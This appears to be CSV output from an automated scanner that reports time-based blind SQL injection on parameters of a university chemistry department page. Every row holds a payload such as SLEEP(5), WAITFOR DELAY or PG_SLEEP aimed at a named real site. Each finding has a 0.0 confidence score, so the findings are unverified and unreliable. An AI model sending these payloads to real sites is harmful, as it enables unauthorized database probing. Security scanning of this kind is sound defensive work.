Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
